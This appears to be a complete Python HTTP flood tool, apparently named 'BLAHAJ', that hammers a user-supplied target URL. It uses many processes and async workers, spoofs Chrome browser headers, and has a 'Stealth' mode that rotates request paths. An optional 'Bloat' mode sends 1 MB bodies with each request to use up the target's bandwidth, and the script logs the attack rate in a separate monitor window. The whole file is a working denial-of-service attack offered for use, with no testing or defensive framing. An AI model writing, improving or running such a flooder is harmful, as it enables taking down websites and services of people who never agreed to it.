import asyncio
import random
import time
import sys
import os
import httpx
import requests
import subprocess
import multiprocessing
import ctypes
import socket
import argparse

# --- CONFIGURATION ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "blahaj_live.log")
MONITOR_BAT = os.path.join(BASE_DIR, "beamer_monitor.bat")

LIGHT_BLUE = "\033[94m"
RESET = "\033[0m"

PATHS = ["/", "/login", "/dashboard", "/api/v1", "/index.html", "/profile", "/settings"]
SUBDOMAIN_LIST = ["api", "dev", "test", "shop", "blog", "admin", "v1", "v2", "beta", "cdn"]

CHROME_HEADERS = {
    "sec-ch-ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "upgrade-insecure-requests": "1",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9",
}

def create_monitor_script(target, mode, bloat):
    try:
        with open(MONITOR_BAT, "w", encoding="utf-8") as f:
            f.write("@echo off\ncolor 09\ntitle BLAHAJ MONITOR\n:loop\ncls\n")
            f.write(f"echo TARGET : {target}\necho MODE   : {mode}\n")
            f.write("echo ------------------------------------\n")
            f.write(f'powershell -Command "if (Test-Path \'{LOG_FILE}\') {{ Get-Content \'{LOG_FILE}\' -Tail 15 }}"\n')
            f.write("timeout /t 1 >nul\ngoto loop\n")
    except: pass

async def worker_logic(targets, mode, method, use_proxy, proxies, shared_bytes, bloat):
    limits = httpx.Limits(max_connections=1000, max_keepalive_connections=200)
    bloat_content = "X" * (1024 * 1024) if bloat else ""
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10, limits=limits) as client:
        while True:
            try:
                base = random.choice(targets)
                target = base
                curr_method = method
                if mode == "Stealth":
                    path = random.choice(PATHS)
                    target = base.rstrip('/') + path
                    curr_method = "POST" if ("login" in path or bloat) else "GET"
                data = bloat_content if (bloat or curr_method == "POST") else None
                await client.request(curr_method, target, headers=CHROME_HEADERS, content=data)
                with shared_bytes.get_lock():
                    shared_bytes.value += (len(target) + len(bloat_content))
            except: pass
            await asyncio.sleep(0)

def bandwidth_reporter(shared_bytes):
    last_val = 0
    while True:
        time.sleep(1)
        current_val = shared_bytes.value
        diff = current_val - last_val
        last_val = current_val
        speed_mb = (diff / 1024) / 1024
        try:
            with open(LOG_FILE, "a") as f:
                f.write(f"[{time.strftime('%H:%M:%S')}] SPEED: {speed_mb:.2f} MB/s\n")
        except: pass

def process_entry(targets, mode, method, use_proxy, proxies, threads, shared_bytes, bloat):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = [loop.create_task(worker_logic(targets, mode, method, use_proxy, proxies, shared_bytes, bloat)) for _ in range(threads)]
    loop.run_until_complete(asyncio.gather(*tasks))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url")
    parser.add_argument("--mode", default="Standard")
    parser.add_argument("--method", default="GET")
    parser.add_argument("--threads", type=int, default=50)
    parser.add_argument("--cores", type=int, default=1)
    parser.add_argument("--bloat", default="n")
    args = parser.parse_args()

    if args.url:
        url, mode, method = args.url, args.mode, args.method
        threads, cores, bloat = args.threads, args.cores, (args.bloat == 'y')
        beam_subs, use_proxy = False, False
    else:
        url = input("Target URL: ").strip()
        bloat = input("Enable Bloater? (y/n): ").lower() == 'y'
        mode = "Stealth" if input("Mode [1. Std, 2. Stealth]: ") == "2" else "Standard"
        method = "POST" if bloat else (input("Method [GET]: ").upper() or "GET")
        cores = int(input("Cores: ") or "1")
        threads = int(input("Threads: ") or "50")
        beam_subs, use_proxy = False, False

    clean = url.replace("http://", "").replace("https://", "").split('/')[0]
    targets = [f"http://{clean}"]
    shared_bytes = multiprocessing.Value(ctypes.c_longlong, 0)
    
    if os.name == 'nt':
        create_monitor_script(targets[0], mode, bloat)
        subprocess.Popen(['start', 'cmd', '/c', MONITOR_BAT], shell=True)

    multiprocessing.Process(target=bandwidth_reporter, args=(shared_bytes,), daemon=True).start()
    processes = []
    for _ in range(cores):
        p = multiprocessing.Process(target=process_entry, args=(targets, mode, method, use_proxy, [], threads, shared_bytes, bloat))
        p.start()
        processes.append(p)
    try:
        for p in processes: p.join()
    except KeyboardInterrupt:
        for p in processes: p.terminate()